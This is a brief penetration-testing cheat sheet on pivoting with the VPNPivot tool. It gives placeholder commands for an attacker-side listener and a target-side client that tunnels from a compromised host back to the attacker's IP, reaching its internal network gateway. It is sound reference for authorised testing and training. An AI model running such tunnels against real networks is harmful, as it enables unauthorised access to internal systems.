# Pivoting
---

## VPNPivot

#### On attacker machine

`$ sudo pivots -i <iface> -p <port> -H <mac> -v`

* __iface__ - is the virtual interface for the vpn itself, as example openvpn often creates tap0 or tun0, you can choose whaterver you want, like pwn0;
* __mac__ - MAC address for the newly created device;
* __port__ - whatever unused port you want


#### On target machine

`$ sudo pivotc <attacker-ip> <previously defined port> <internal network gateway ip>`
